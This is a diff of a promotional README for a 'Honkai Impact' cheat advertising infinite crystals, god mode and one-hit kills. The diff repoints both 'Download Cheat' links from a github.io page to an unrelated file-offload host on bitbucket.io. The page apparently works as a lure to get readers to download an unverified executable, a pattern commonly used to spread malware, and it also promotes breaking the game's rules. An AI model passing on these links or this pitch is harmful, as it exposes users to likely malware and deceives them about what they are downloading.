@@ -4,7 +4,7 @@
 
 From **infinite crystals and stamina** to **god mode and one-hit kills**, this cheat power-up turns your squad into unstoppable cosmic queens.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/honkai-impact/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🎮 What Is a Honkai Impact Cheat?
@@ -18,7 +18,7 @@ Ideal for:
 * 🧪 Combo testing
 * 🎮 AFK-style farming
 
-[![Download Cheat](https://i.ytimg.com/vi/XsV3nmVdYQI/maxresdefault.jpg)](https://wecheaters.github.io/cheats/honkai-impact/)
+[![Download Cheat](https://i.ytimg.com/vi/XsV3nmVdYQI/maxresdefault.jpg)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🔥 Most Popular Honkai Impact Cheat Features
@@ -120,3 +120,4 @@ honkai impact cheat, god mode honkai, infinite crystals hack, honkai 3rd cheat t
 
 **Style, speed, and no more suffering.**
 With a **Honkai Impact Cheat**, you're not just fighting the Honkai — you're rewriting the universe with every slash. 🌌💥🎮
+
